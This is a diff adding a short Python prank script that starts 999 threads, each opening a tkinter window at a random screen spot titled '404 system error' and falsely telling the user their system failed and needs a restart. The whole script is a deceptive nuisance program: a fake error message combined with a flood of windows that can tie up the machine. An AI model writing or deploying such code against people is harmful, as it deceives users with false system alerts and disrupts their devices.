@@ -1,0 +1,22 @@
+__author__ = 'Allan'
+import threading
+from time import time
+import tkinter as tk
+from tkinter import messagebox
+import random
+import time
+def dow():
+    window = tk.Tk()
+    width = window.winfo_screenwidth()
+    height = window.winfo_screenheight()
+    a = random.randrange(0, width)
+    b = random.randrange(0, height)
+    window.title('404 system error')
+    window.geometry("500x250"+"+"+str(a)+"+"+str(b))
+    tk.Label(window, text='Your system ran into an error. please restart the device.', bg='Red', font=('Arial', 15), width=200, height=20).pack()
+    window.mainloop()
+
+
+for i in range(999):
+    threading.Thread(target=dow).start()
+    time.sleep(0.1)
